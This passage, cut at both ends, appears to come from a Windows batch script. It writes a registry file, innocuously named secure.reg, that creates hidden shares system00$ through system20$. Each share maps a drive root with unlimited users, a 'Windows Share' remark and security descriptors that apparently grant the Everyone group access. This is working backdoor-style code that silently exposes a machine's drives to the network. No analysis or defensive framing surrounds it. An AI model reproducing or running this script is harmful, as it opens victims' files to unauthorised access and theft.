echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   49,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system05$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   4a,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system06$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   4b,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system07$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   4c,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system08$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   4d,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system09$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   4e,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system10$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   4f,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system11$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   50,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system12$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   51,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system13$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo  00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   52,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system14$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   53,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system15$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   54,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system16$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   55,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system17$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   56,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system00$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   44,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo.                                                                               >>C:\WINDOWS\secure.reg               
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\Shares\Security]>>C:\WINDOWS\secure.reg
echo "academics"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system00$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system01$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system02$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system03$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system04$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system05$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system07$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system08$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system09$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system10$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system11$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system12$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system13$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system14$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system15$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system16$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system17$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system18$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system19$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system20$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
